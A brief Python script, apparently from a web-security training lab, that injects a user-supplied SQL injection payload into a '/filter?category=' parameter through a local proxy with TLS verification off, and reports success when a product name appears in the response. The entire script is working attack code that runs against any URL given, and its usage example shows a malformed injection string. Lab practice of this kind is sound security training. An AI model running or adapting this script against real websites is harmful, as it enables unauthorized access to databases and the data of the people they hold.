import requests, urllib3, sys, urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def sqli(url, payload):
    path='/filter?category='
    r = requests.get(url+path+payload, verify=False, proxies=proxies)
    return True if 'The Lazy Dog' in r.text else False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except:
        print("[*] Usage: %s <url> <payload>" % sys.argv[0])
        print("[*] Example: %s 'www.example.com' 'or1=1" % sys.argv[0])
        sys.exit(-1)
    
    print('SUCCESSFUL' if sqli(url, payload) else 'NOT SUCCESSFUL')